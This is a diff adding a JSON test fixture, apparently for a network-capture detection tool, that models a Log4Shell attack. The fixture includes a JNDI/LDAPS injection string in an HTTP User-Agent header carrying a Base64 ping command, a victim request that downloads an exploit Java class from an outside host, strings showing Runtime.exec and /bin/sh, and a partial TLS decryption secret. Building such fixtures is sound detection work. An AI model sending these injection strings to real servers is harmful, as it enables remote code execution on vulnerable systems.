@@ -1,0 +1,118 @@
+{
+  "case_id": "log4shell_ldaps_443_dsb_001",
+  "source_file": "log4shell-ldaps-port-443-dsb.pcapng",
+  "notes": "LDAPS callback is TLS-encrypted. The pcapng contains a Decryption Secrets Block/CLIENT_RANDOM, but this segmented mock keeps encrypted LDAPS as strategy-required evidence rather than decrypted LDAP records.",
+  "streams": [
+    {
+      "stream_key": "172.17.0.1:38166-172.17.0.2:8000-tcp",
+      "protocol": "HTTP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 4,
+          "time": "0.000092",
+          "timestamp_epoch": "1639517650.860236",
+          "position": "http_header.user_agent",
+          "payload": "GET /test HTTP/1.1\r\nHost: 172.17.0.2:8000\r\nUser-Agent: ${jndi:ldaps://ldaps.suspect.network:443/Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x}\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
+          "candidate_hint": "jndi_ldaps_nested_base64",
+          "expected_normalized": "${jndi:ldaps://ldaps.suspect.network:443/Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x}",
+          "nested_base64": "cGluZyAtYyAxMCAxLjEuMS4x",
+          "nested_decoded_preview": "ping -c 10 1.1.1.1"
+        },
+        {
+          "no": 47,
+          "time": "0.055777",
+          "timestamp_epoch": "1639517650.915921",
+          "position": "http_response.header",
+          "payload": "HTTP/1.1 200 OK\r\nDate: Tue, 14 Dec 2021 21:34:10 GMT\r\nContent-length: 20\r\n\r\n"
+        },
+        {
+          "no": 49,
+          "time": "0.055866",
+          "timestamp_epoch": "1639517650.916010",
+          "position": "http_response.body",
+          "payload": "This is the response"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.2:55936-34.91.73.37:443-tcp",
+      "protocol": "LDAPS/TLS",
+      "encrypted": true,
+      "tls_decryption_secret_present": true,
+      "decryption_secret_type": "CLIENT_RANDOM/DSB",
+      "decryption_secret_preview": "CLIENT_RANDOM 61b90dd2f274c99e9c4df24d8b063517713231b6bac55ec8eac2e93832950da3 c59840e0b457aabc8...",
+      "segments": [
+        {
+          "no": 9,
+          "time": "0.009721",
+          "timestamp_epoch": "1639517650.869865",
+          "position": "tls.client_hello",
+          "payload": "<encrypted TLS handshake bytes omitted>",
+          "candidate_hint": "encrypted_ldaps_callback"
+        },
+        {
+          "no": 11,
+          "time": "0.010580",
+          "timestamp_epoch": "1639517650.870724",
+          "position": "tls.server_hello_certificate",
+          "payload": "<TLS ServerHello/Certificate bytes omitted; certificate strings include ldaps.suspect.network>",
+          "candidate_hint": "ldaps_certificate"
+        },
+        {
+          "no": 23,
+          "time": "0.038023",
+          "timestamp_epoch": "1639517650.898167",
+          "position": "tls.application_data",
+          "payload": "<encrypted LDAPS application data; requires DSB/session key for LDAP payload decoding>",
+          "candidate_hint": "encrypted_payload_strategy_required"
+        },
+        {
+          "no": 27,
+          "time": "0.040742",
+          "timestamp_epoch": "1639517650.900886",
+          "position": "tls.application_data",
+          "payload": "<encrypted LDAPS application data; requires DSB/session key for LDAP payload decoding>",
+          "candidate_hint": "encrypted_payload_strategy_required"
+        },
+        {
+          "no": 28,
+          "time": "0.043809",
+          "timestamp_epoch": "1639517650.903953",
+          "position": "tls.application_data",
+          "payload": "<encrypted LDAPS application data; requires DSB/session key for LDAP payload decoding>",
+          "candidate_hint": "encrypted_payload_strategy_required"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.2:54814-34.91.73.37:8080-tcp",
+      "protocol": "HTTP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 33,
+          "time": "0.046151",
+          "timestamp_epoch": "1639517650.906295",
+          "position": "http_request.java_class_download",
+          "payload": "GET /Exploiti979xwPA6O.class HTTP/1.1\r\nUser-Agent: Java/1.8.0_181\r\nHost: 34.91.73.37:8080\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\nConnection: keep-alive\r\n\r\n"
+        },
+        {
+          "no": 35,
+          "time": "0.048440",
+          "timestamp_epoch": "1639517650.908584",
+          "position": "http_response.java_class_header",
+          "payload": "HTTP/1.1 200 OK\r\nDate: Tue, 14 Dec 2021 21:34:10 GMT\r\nContent-length: 1217\r\n\r\n"
+        },
+        {
+          "no": 37,
+          "time": "0.048776",
+          "timestamp_epoch": "1639517650.908920",
+          "position": "java_class_binary.summary",
+          "payload": "Java class binary contains strings: Exploiti979xwPA6O, @com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet, /bin/sh, java/lang/Runtime, getRuntime, ()Ljava/lang/Runtime;, exec, ping -c 10 1.1.1.1",
+          "candidate_hint": "runtime_exec_command"
+        }
+      ]
+    }
+  ]
+}
